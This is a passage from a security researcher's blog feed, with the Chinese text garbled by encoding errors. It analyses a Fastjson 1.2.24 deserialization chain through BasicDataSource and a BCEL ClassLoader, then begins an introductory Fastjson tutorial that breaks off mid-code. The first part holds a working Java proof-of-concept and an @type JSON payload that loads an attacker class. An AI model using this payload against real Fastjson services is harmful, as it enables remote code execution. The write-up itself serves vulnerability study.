src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212140268.png" alt="image-20230821214024960"><br>ÂëΩ‰ª§ÊâßË°åÁöÑÂú∞ÊñπÂú®<code>defineClass</code>Âç≥Âä®ÊÄÅÁ±ªÂä†ËΩΩÔºå‰ΩÜËøõÂÖ•ËøôÈáåÈ¶ñÂÖà<code>clazz</code>‰∏çËÉΩ‰∏∫nullÔºåÊ≠§Êó∂Â¶ÇÊûú<code>class_name</code>ÂâçÂá†‰Ωç‰∏∫<code>$$BCEL$$</code>Â∞±‰ºöÂéªÊâßË°å<code>createClass</code>ÂàõÂª∫‰∏Ä‰∏™ClasszËøôÊ†∑Â∞±ËÉΩÊù•Âà∞<code>defineClass</code>Âä†ËΩΩÂà∞ÊÅ∂ÊÑèÁ±ªËøîÂõûÁ±ªÁöÑÂØπË±°ÔºåÂú®<code>newInstance()</code>ÁöÑÊó∂ÂÄôÂ∞±‰ºöÂëΩ‰ª§ÊâßË°åÔºåÈÇ£‰πàÁé∞Âú®Â∞±ÊòØÊâæÂì™ÈáåËÉΩË∞ÉÁî®loadClassÔºåÊúÄÁªàÊòØÊâæÂà∞‰∫Ü<code>BasicDataSource</code>Á±ªÔºåÂú®<code>createConnectionFactory()</code>ÊñπÊ≥ï‰∏≠‰ºöË∞ÉÁî®Áî®forNameÂÖ∂ÂÆûÂ∫ïÂ±ÇÂ∞±ÊòØË∞ÉÁî®loadClassÔºàÁôΩÊó•Ê¢¶ÁªÑÈïøËØ¥ÁöÑÔºåÂÖ∑‰ΩìÊ≤°Ë∑üÔºâ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212140198.png" alt="image-20230821214040909"><br>ÁÑ∂ÂêéÂ∞±ÊòØÁúãËøô‰∏§‰∏™ÂèòÈáèÂèØ‰∏çÂèØÊéßÔºåËÆ©ClassName‰∏∫ÊÅ∂ÊÑèÁöÑnameÔºåClassLoad‰∏∫‰∏äÈù¢Dome‰∏≠ÁöÑÔºåÂú®ËøôÈáåÂÖ∂ÂÆûÊòØÊúâÂØπÂ∫îÁöÑsetterÂíågetter<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212140823.png" alt="image-20230821214059194"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212141349.png" alt="image-20230821214110741"><br>ÈÇ£‰πàËøô‰∏§‰∏™ÂèòÈáèÂèØÊéßÁé∞Âú®ÁúãËÉΩ‰∏çËÉΩË∞ÉÁî®Âà∞<code>createConnectionFactory()</code>ÊñπÊ≥ïÔºåÊâæÂà∞‰∫Ü<code>createDataSource()</code>ÊñπÊ≥ïÔºåÁªßÁª≠ÂæÄ‰∏äÊâæ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212141753.png" alt="image-20230821214124132"><br>ÊúÄÁªàÂú®<code>getConnection()</code>‰∏≠Ë∞ÉÁî®‰∫Ü<code>createDataSource()</code>ÊñπÊ≥ïÔºå‰∏î‰∏∫getterÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212141100.png" alt="image-20230821214138477"></p><h3 id="ÊûÑÈÄ†exp"><a href="#ÊûÑÈÄ†exp" class="headerlink" title="ÊûÑÈÄ†exp"></a>ÊûÑÈÄ†exp</h3><p>Â∞ùËØïÊûÑÈÄ†‰∏Ä‰∏ãexp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;  </span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.dbcp.dbcp2.BasicDataSource;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BcelPoc</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="comment">//‰ΩøÁî®BCEL(Byte Code Engineering Library)ÁöÑRepositoryÁ±ªÁöÑlookupClassÊñπÊ≥ïÔºå  </span></span><br><span class="line">        <span class="comment">// Â∞ùËØï‰ªéÁ±ªË∑ØÂæÑ‰∏≠Êü•ÊâæÂêç‰∏∫ &#x27;calc.class&#x27; ÁöÑÁ±ªÔºåÂπ∂ËøîÂõû‰∏Ä‰∏™ JavaClass ÂØπË±°„ÄÇ  </span></span><br><span class="line">        <span class="comment">//&#x27;JavaClass&#x27; ÊòØ BCEL Êèê‰æõÁöÑÁ±ªÔºåÁî®‰∫éË°®Á§∫Â∑≤Âä†ËΩΩÁöÑ Java Á±ª„ÄÇ  </span></span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(Evil.class);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//‰ΩøÁî® BCEL Êèê‰æõÁöÑ &#x27;Utility&#x27; Á±ªÁöÑ &#x27;encode&#x27; ÊñπÊ≥ïÔºåÂ∞ÜÂ≠óËäÇÁ†Å‰ΩøÁî®base64ËøõË°åÁºñÁ†ÅÔºö  </span></span><br><span class="line">        <span class="comment">// &#x27;cls.getBytes()&#x27; ËøîÂõûË°®Á§∫ &#x27;calc.class&#x27; Â≠óËäÇÁ†ÅÁöÑÂ≠óËäÇÊï∞ÁªÑÔºõtrueË°®Á§∫ÁºñÁ†ÅËøáÁ®ã‰∏≠ËøõË°åÂàÜÂâ≤  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(cls.getBytes(),<span class="literal">true</span>);  </span><br><span class="line">        System.out.println(<span class="string">&quot;$$BCEL$$&quot;</span>+code);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="type">BasicDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BasicDataSource</span>();  </span><br><span class="line">        dataSource.setDriverClassLoader(<span class="keyword">new</span> <span class="title class_">ClassLoader</span>());  </span><br><span class="line">        dataSource.setDriverClassName(<span class="string">&quot;$$BCEL$$&quot;</span>+code);  </span><br><span class="line">        dataSource.getConnection();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212142301.png" alt="image-20230821214200048"><br>ÊàêÂäüÊâßË°åÔºåÁé∞Âú®Êç¢Êàê<code>@type</code>ÂΩ¢ÂºèÁöÑÂ∞±OK‰∫Ü</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;  </span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.dbcp.dbcp2.BasicDataSource;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BcelPoc</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="comment">//‰ΩøÁî®BCEL(Byte Code Engineering Library)ÁöÑRepositoryÁ±ªÁöÑlookupClassÊñπÊ≥ïÔºå  </span></span><br><span class="line">        <span class="comment">// Â∞ùËØï‰ªéÁ±ªË∑ØÂæÑ‰∏≠Êü•ÊâæÂêç‰∏∫ &#x27;calc.class&#x27; ÁöÑÁ±ªÔºåÂπ∂ËøîÂõû‰∏Ä‰∏™ JavaClass ÂØπË±°„ÄÇ  </span></span><br><span class="line">        <span class="comment">//&#x27;JavaClass&#x27; ÊòØ BCEL Êèê‰æõÁöÑÁ±ªÔºåÁî®‰∫éË°®Á§∫Â∑≤Âä†ËΩΩÁöÑ Java Á±ª„ÄÇ  </span></span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(Evil.class);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//‰ΩøÁî® BCEL Êèê‰æõÁöÑ &#x27;Utility&#x27; Á±ªÁöÑ &#x27;encode&#x27; ÊñπÊ≥ïÔºåÂ∞ÜÂ≠óËäÇÁ†Å‰ΩøÁî®base64ËøõË°åÁºñÁ†ÅÔºö  </span></span><br><span class="line">        <span class="comment">// &#x27;cls.getBytes()&#x27; ËøîÂõûË°®Á§∫ &#x27;calc.class&#x27; Â≠óËäÇÁ†ÅÁöÑÂ≠óËäÇÊï∞ÁªÑÔºõtrueË°®Á§∫ÁºñÁ†ÅËøáÁ®ã‰∏≠ËøõË°åÂàÜÂâ≤  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(cls.getBytes(),<span class="literal">true</span>);  </span><br><span class="line">        System.out.println(<span class="string">&quot;$$BCEL$$&quot;</span>+code);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        BasicDataSource dataSource = new BasicDataSource();  </span></span><br><span class="line"><span class="comment">//        dataSource.setDriverClassLoader(new ClassLoader());  </span></span><br><span class="line"><span class="comment">//        dataSource.setDriverClassName(&quot;$$BCEL$$&quot;+code);  </span></span><br><span class="line"><span class="comment">//        dataSource.getConnection();  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//driverClassLoaderÈúÄË¶Å‰º†ÂÖ•ÁöÑÊòØClassLoaderÂØπË±°ÊâÄ‰ª•‰πüÈúÄË¶ÅÁî®@typeÂΩ¢ÂºèÂºïÂÖ•  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot;</span> +code +<span class="string">&quot;\&quot;,\&quot;driverClassLoader\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parseObject(s);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÂêéÈù¢‰∏ÄÂÆöË¶ÅÁî®<code>parseObject()</code>ÂéªÂèçÂ∫èÂàóÂåñÔºåÂõ†‰∏∫Êàë‰ª¨Ë¶ÅË∞ÉÂÆÉÁöÑ<code>getConnection()</code>‰∏∫getterÊñπÊ≥ïÈúÄË¶ÅËøõÂÖ•<code>toJSON()</code>ÊñπÊ≥ï‰∏≠<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212142147.png" alt="image-20230821214212598"><br>ËøôÊù°ÈìæÂ≠êÂú®‰∏çÂá∫ÁΩëÁöÑÊó∂ÂÄôÂèØ‰ª•Âà©Áî®</p><h2 id="ÊÄªÁªì"><a href="#ÊÄªÁªì" class="headerlink" title="ÊÄªÁªì"></a>ÊÄªÁªì</h2><p>JdbcRowSetImplËøôÊù°Èìæ‰∏ÄÂºÄÂßãÊ≤°ÊâìÈÄöÊêûÂæóÂæàÁÉ¶ÔºåÊÄªÁöÑÊù•ËØ¥Ë∑üÁöÑ‰∏çÊòØÂæàÊ∑±ÔºåÂèØËÉΩÂêéÈù¢‰ºöÊù•ÂÜçÁúãÔºåÂè¶Â§ñÊÑüËßâÂú®ObsidianÂÜô‰∫ÜÊñáÁ´†ÔºåÁÑ∂ÂêéÂà©Áî®TyporaÂèëÂçöÂÆ¢ÂõæÁâáÂ§ÑÁêÜÁúüÁöÑÈ∫ªÁÉ¶Ôºå‰∏çÁü•ÈÅìÊúâÊ≤°ÊúâÂï•Â•ΩÂäûÊ≥ï</p><h2 id="ÂèÇËÄÉ"><a href="#ÂèÇËÄÉ" class="headerlink" title="ÂèÇËÄÉ"></a>ÂèÇËÄÉ</h2><p><a href="https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">FastjsonÁ≥ªÂàó‰∫å‚Äî‚Äî1.2.22-1.2.24ÂèçÂ∫èÂàóÂåñÊºèÊ¥û [ Mi1k7ea ]</a><br><a href="https://blog.csdn.net/NicolasZQ/article/details/130004281?spm=1001.2014.3001.5502">„Äê‰∏§‰∏áÂ≠óÂéüÂàõÈïøÊñá„ÄëÂÆåÂÖ®Èõ∂Âü∫Á°ÄÂÖ•Èó®FastjsonÁ≥ªÂàóÊºèÊ¥ûÔºàÂü∫Á°ÄÁØáÔºâ_W01fh4ckerÁöÑÂçöÂÆ¢-CSDNÂçöÂÆ¢</a><br><a href="https://drun1baby.top/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#2-EXP-%E6%9E%84%E9%80%A0">JavaÂèçÂ∫èÂàóÂåñFastjsonÁØá02-Fastjson-1.2.24ÁâàÊú¨ÊºèÊ¥ûÂàÜÊûê | Drunkbaby‚Äôs Blog (drun1baby.top)</a><br><a href="https://blog.csdn.net/gamma_lab/article/details/123294137">Á∫¢ÈòüÊºèÊ¥ûÁ†îÁ©∂-fastjsonBasicDataSourceÈìæÂàÜÊûê_Gamma_labÁöÑÂçöÂÆ¢-CSDNÂçöÂÆ¢</a><br><a href="https://www.freebuf.com/articles/web/373730.html">Âà©Áî®BCELÊâìfastjsonÁõ¥Êé•burpÂõûÊòægetshell - FreeBufÁΩëÁªúÂÆâÂÖ®Ë°å‰∏öÈó®Êà∑</a></p><p><a href="https://www.bilibili.com/video/BV1pP411N726/?spm_id_from=333.788&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7">https://www.bilibili.com/video/BV1pP411N726/?spm_id_from=333.788&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaÂÆâÂÖ® </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaÂèçÂ∫èÂàóÂåñ‰πãFastjsonÂÖ•Èó®ÁØá</title>
      <link href="/2023/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BFastjson%E5%85%A5%E9%97%A8%E7%AF%87/"/>
      <url>/2023/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BFastjson%E5%85%A5%E9%97%A8%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="FastJsonÁÆÄ‰ªã"><a href="#FastJsonÁÆÄ‰ªã" class="headerlink" title="FastJsonÁÆÄ‰ªã"></a>FastJsonÁÆÄ‰ªã</h2><p>Fastjson ÊòØ Alibaba ÂºÄÂèëÁöÑ Java ËØ≠Ë®ÄÁºñÂÜôÁöÑÈ´òÊÄßËÉΩ JSON Â∫ìÔºå‰ª•ÂÖ∂ÁâπÊúâÁöÑÁÆóÊ≥ïÔºåÂè∑Áß∞ÊúÄÂø´ÁöÑjsonÂ∫ìÔºåÁî®‰∫éÂ∞ÜÊï∞ÊçÆÂú® JSON Âíå Java Object ‰πãÈó¥‰∫íÁõ∏ËΩ¨Êç¢„ÄÇ<br>Êèê‰æõ‰∏§‰∏™‰∏ªË¶ÅÊé•Âè£Êù•ÂàÜÂà´ÂÆûÁé∞Â∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñÊìç‰Ωú„ÄÇ<br><code>JSON.toJSONString</code> Â∞Ü Java ÂØπË±°ËΩ¨Êç¢‰∏∫ json ÂØπË±°ÔºåÂ∫èÂàóÂåñÁöÑËøáÁ®ã„ÄÇ<br><code>JSON.parseObject/JSON.parse</code> Â∞Ü json ÂØπË±°ÈáçÊñ∞ÂèòÂõû Java ÂØπË±°ÔºõÂèçÂ∫èÂàóÂåñÁöÑËøáÁ®ã</p><h2 id="ÈÄöËøá‰ª£Á†ÅÁÆÄÂçï‰∫ÜËß£"><a href="#ÈÄöËøá‰ª£Á†ÅÁÆÄÂçï‰∫ÜËß£" class="headerlink" title="ÈÄöËøá‰ª£Á†ÅÁÆÄÂçï‰∫ÜËß£"></a>ÈÄöËøá‰ª£Á†ÅÁÆÄÂçï‰∫ÜËß£</h2><p>È¶ñÂÖàÂØºÂÖ•‰æùËµñ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">1.2</span><span class="number">.24</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÂÆö‰πâ‰∏™StudentÁ±ª</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Dome;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;ÊûÑÈÄ†ÂáΩÊï∞&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÊòØÂ∫èÂàóÂåñÁöÑ‰ª£Á†ÅÔºåË∞ÉÁî® <code>JSON.toJsonString()</code> Êù•Â∫èÂàóÂåñ Student Á±ªÁöÑÂØπË±° Ôºö<br>StudentSerialize.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Dome;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentSerialize</span> &#123;  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;  </span><br><span class="line">                <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();  </span><br><span class="line">                student.setName(<span class="string">&quot;y0n3er&quot;</span>);  </span><br><span class="line">                student.setAge(<span class="number">6</span>);  </span><br><span class="line">                <span class="type">String</span> <span class="variable">jsonstring</span> <span class="operator">=</span> JSON.toJSONString(student, SerializerFeature.WriteClassName);  </span><br><span class="line">                System.out.println(jsonstring);  </span><br><span class="line">        &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÈáåË∑ü‰∏Ä‰∏ãÂ∫èÂàóÂåñÁöÑËøáÁ®ãÔºåÂú®<code>toJSONString()</code>ÊñπÊ≥ïÈÇ£Èáå‰∏ã‰∏™Êñ≠ÁÇπÔºåË∑üËøõÊù•Âà∞JSONÁ±ª‰∏ãÁöÑ<code>toJSONString()</code>ÊñπÊ≥ï‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308082232163.png" alt="image-20230808223154139"><br>Âú®ËøôÈáåÂ§öÂá∫‰∫Ü‰∏™ static ÁöÑÂèòÈáèÔºåÂÜôÁùÄ ‚Äúmembers of JSON‚ÄùÔºåËøôÈáåË¶ÅÁâπÂà´Ê≥®ÊÑè‰∏Ä‰∏™ÂÄº <code>DEFAULT_TYPE_KEY</code> ‰∏∫ ‚Äú@type‚ÄùÔºåËøô‰∏™Êå∫ÈáçË¶ÅÁöÑÔºåÁÑ∂ÂêéÂ∞±ÊòØ‰∏Ä‰∫õÂàùÂßãÂÄºËµãÂÄºÁªôoutÔºåËøô‰∏™out‰Ωú‰∏∫ÂêéÁª≠<code>JSONSerializer</code>ÊûÑÈÄ†ÂáΩÊï∞ÁöÑÂèÇÊï∞ÔºåÁúãÂ§ß‰Ω¨ËØ¥Ëøô‰∏ÄÊ≠•Ëµ∞ÂÆåÂÖ∂ÂÆûÂ∞±Â∑≤ÁªèÂÆåÊàê‰∫ÜÂ∫èÂàóÂåñÔºå‰ΩÜÊòØÊàëÊÑüËßâÊòØËµ∞ÂÆå‰∫Ü<code>serializer.write(object);</code>ËøôÈáåÂÆåÊàêÂ∫èÂàóÂåñÔºå‰πü‰∏çÂ§™Ê∏ÖÊ•ö<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308082232622.png" alt="image-20230808223233965"><br>ÁÑ∂ÂêéÂ∞±ÊòØÂà∞<code>toString()</code>ËøôÈáåÂ∫èÂàóÂåñÁöÑÊï∞ÊçÆËøõË°åÊòæÁ§∫<br>ËøôÈáåÂàÜÊûê‰∏Ä‰∏ã‰∏ãÈù¢ËøôÊù°ËØ≠Âè•ÂèÇÊï∞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(student, SerializerFeature.WriteClassName);</span><br></pre></td></tr></table></figure><p>Á¨¨‰∏Ä‰∏™ÂèÇÊï∞ÊòØ studentÔºåÊòØ‰∏Ä‰∏™ÂØπË±°ÔºåÂ∞±‰∏çÂ§öËØ¥‰∫ÜÔºõ<br>Á¨¨‰∫å‰∏™ÂèÇÊï∞ÊòØ <code>SerializerFeature.WriteClassName</code>ÔºåÊòØ <code>JSON.toJSONString()</code> ‰∏≠ÁöÑ‰∏Ä‰∏™ËÆæÁΩÆÂ±ûÊÄßÂÄºÔºåËÆæÁΩÆ‰πãÂêéÂú®Â∫èÂàóÂåñÁöÑÊó∂ÂÄô‰ºöÂ§öÂÜôÂÖ•‰∏Ä‰∏™@typeÔºåÂç≥ÂÜô‰∏äË¢´Â∫èÂàóÂåñÁöÑÁ±ªÂêçÔºåtype ÂèØ‰ª•ÊåáÂÆöÂèçÂ∫èÂàóÂåñÁöÑÁ±ªÔºåÂπ∂‰∏îË∞ÉÁî®ÂÖ∂ <code>getter</code>&#x2F;<code>setter</code>&#x2F;<code>is</code> ÊñπÊ≥ï„ÄÇ</p><ul><li>Fastjson Êé•ÂèóÁöÑ JSON ÂèØ‰ª•ÈÄöËøá@typeÂ≠óÊÆµÊù•ÊåáÂÆöËØ•JSONÂ∫îÂΩìËøòÂéüÊàê‰ΩïÁßçÁ±ªÂûãÁöÑÂØπË±°ÔºåÂú®ÂèçÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôÊñπ‰æøÊìç‰Ωú„ÄÇ<br>ËæìÂá∫Â¶Ç‰∏ãÔºö<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ËÆæÁΩÆ‰∫ÜSerializerFeature.WriteClassName</span></span><br><span class="line">ÊûÑÈÄ†ÂáΩÊï∞</span><br><span class="line">setName</span><br><span class="line">setAge</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Dome.Student&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">6</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;y0n3er&quot;</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Êú™ËÆæÁΩÆSerializerFeature.WriteClassName</span></span><br><span class="line">ÊûÑÈÄ†ÂáΩÊï∞</span><br><span class="line">setName</span><br><span class="line">setAge</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="number">6</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;y0n3er&quot;</span>&#125;</span><br></pre></td></tr></table></figure><strong>ÂèçÂ∫èÂàóÂåñ‰ª£Á†Å</strong><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 